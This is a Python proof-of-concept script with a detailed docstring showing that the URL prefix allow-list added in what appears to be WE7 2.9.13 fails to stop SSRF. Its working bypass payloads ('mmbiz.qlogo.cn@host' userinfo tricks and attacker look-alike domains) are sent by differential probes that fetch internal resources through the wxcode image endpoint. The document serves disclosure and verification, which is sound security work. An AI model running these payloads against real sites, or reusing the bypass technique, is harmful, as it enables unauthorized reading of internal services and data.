#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WE7-7 - the SSRF fix in 2.9.13 is incomplete: the allow-list can be bypassed.

WHAT THIS IS
------------
Earlier releases (1.7.x - 2.7.x) had an unauthenticated full-read SSRF at
  /web/index.php?c=utility&a=wxcode&do=image&attach=<url>
That original issue was published in March 2021 (xq17, "代码审计之某通用商城系统
getshell过程", section 0x04) and is NOT what this script reports. If you are
looking at 1.7.x, use we7_2_wxcode_ssrf.py instead.

2.9.13 tried to close it with a URL prefix allow-list. The list is:

  web/source/utility/wxcode.ctrl.php:28
    starts_with($image, array('http://mmbiz.qpic.cn/', 'https://mmbiz.qpic.cn/',
                              'http://mmbiz.qlogo.cn',  'https://mmbiz.qlogo.cn'))

Two entries carry a trailing slash, two do not, and the comparison is a plain
string prefix, so any URL that merely BEGINS with "http://mmbiz.qlogo.cn" is
accepted while its real host is something else:

  http://mmbiz.qlogo.cn.evil.test/...     <- attacker-registered domain
  http://mmbiz.qlogo.cn@127.0.0.1:8080/   <- userinfo trick, host is 127.0.0.1

The result is that the full-read SSRF is still alive in 2.9.13. This script
proves that with a differential whose every case is aimed at the target itself.

HOW IT PROVES IT (no third-party host is contacted, nothing is scanned)
----------------------------------------------------------------------
The "internal" resource used here is the target's own module-list JSON:

    <base>/web/index.php?c=utility&a=modules&do=list      -> a JSON envelope

  A  attach = that same URL, no allow-listed prefix       -> expect EMPTY
  B  attach = http://mmbiz.qlogo.cn@<host:port>/...same   -> expect the JSON  (bypass)
  C  attach = http://mmbiz.qpic.cn@<host:port>/...same    -> expect EMPTY     (control:
                                                             qpic.cn does have the slash)
  D  attach = http://mmbiz.qlogo.cn.<random>.invalid/...  -> expected empty here only
                                                             because the name does not resolve

B returning the JSON while A and C return nothing means the result is produced by
the trailing-slash asymmetry - not by the endpoint echoing whatever it is handed.

Verified on the official 2.9.13 package
(IMS_VERSION 2.9.13, IMS_RELEASE_DATE 202610280001, md5 d14bcecbfb774d27f41c3c43796e2e05).

AFFECTED / STATUS
-----------------
  WE7-7 (this bypass)          2.9.13 only - the allow-list first appeared in 2.9.13
  WE7-2 (original SSRF)        1.7.2 - 1.7.7, no allow-list at all, prior art 2021

Exit codes: 0 = not bypassed, 1 = bypass confirmed, 2 = inconclusive.
"""

import argparse
import json
import random
import string
import sys
import urllib.parse
import urllib.request

ENVELOPE_MARKERS = ('"errno"', '"items"')
TIMEOUT = 15


def http_get(url, timeout=TIMEOUT):
    req = urllib.request.Request(url, headers={
        "User-Agent": "we7-allowlist-bypass-check/1.0",
        "Accept": "*/*",
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:                                    # noqa: BLE001
        return 0, str(e).encode()


def probe(base, attach, timeout=TIMEOUT):
    ep = f"{base}/web/index.php?c=utility&a=wxcode&do=image"
    query = urllib.parse.urlencode({"attach": attach})
    status, body = http_get(f"{ep}&{query}", timeout)
    text = body.decode("utf-8", "replace").strip()
    echoed = (status == 200
              and text.startswith("{")
              and any(m in text for m in ENVELOPE_MARKERS)
              and "<html" not in text.lower())
    return status, len(body), echoed, text[:120]


def main():
    ap = argparse.ArgumentParser(description="WE7-7: 2.9.13 wxcode allow-list bypass (SSRF)")
    ap.add_argument("-u", "--url", required=True, help="site base URL, e.g. http://127.0.0.1:8084")
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    a = ap.parse_args()

    base = a.url.rstrip("/")
    p = urllib.parse.urlparse(base)
    hostport = p.netloc
    internal = f"{base}/web/index.php?c=utility&a=modules&do=list"
    tail = "/web/index.php?c=utility&a=modules&do=list"
    rnd = "".join(random.choice(string.ascii_lowercase) for _ in range(6))

    cases = [
        ("A  no allow-listed prefix (control)", internal),
        ("B  mmbiz.qlogo.cn@host (bypass)", f"http://mmbiz.qlogo.cn@{hostport}{tail}"),
        ("C  mmbiz.qpic.cn@host (control: slash present)", f"http://mmbiz.qpic.cn@{hostport}{tail}"),
        ("D  mmbiz.qlogo.cn.<random>.invalid (no DNS here)",
         f"http://mmbiz.qlogo.cn.{rnd}.invalid{tail}"),
    ]

    rows = []
    for label, attach in cases:
        status, n, echoed, sample = probe(base, attach)
        rows.append({"case": label, "attach": attach, "status": status,
                     "bytes": n, "echoed": echoed, "sample": sample})

    a_row, b_row, c_row = rows[0], rows[1], rows[2]

    if b_row["echoed"] and not a_row["echoed"] and not c_row["echoed"]:
        verdict = "BYPASS CONFIRMED - the 2.9.13 allow-list is incomplete, full-read SSRF is reachable"
        code = 1
    elif a_row["echoed"]:
        verdict = "no allow-list in this build (1.7.x original SSRF - see we7_2_wxcode_ssrf.py)"
        code = 2
    elif b_row["echoed"]:
        verdict = "inconclusive (echo seen, but the controls did not behave as expected)"
        code = 2
    else:
        verdict = "not bypassed"
        code = 0

    if a.json:
        print(json.dumps({"target": base, "check": "WE7-7 wxcode allow-list bypass",
                          "cases": rows, "verdict": verdict}, ensure_ascii=False, indent=2))
    else:
        print(f"target : {base}")
        print("check  : WE7-7 wxcode allow-list bypass (2.9.13)")
        for r in rows:
            print(f"  {r['case']:<46} http={r['status']} bytes={r['bytes']:<5} echoed={'YES' if r['echoed'] else 'no'}")
        print(f"\n  verdict : {verdict}")

    return code


if __name__ == "__main__":
    sys.exit(main())
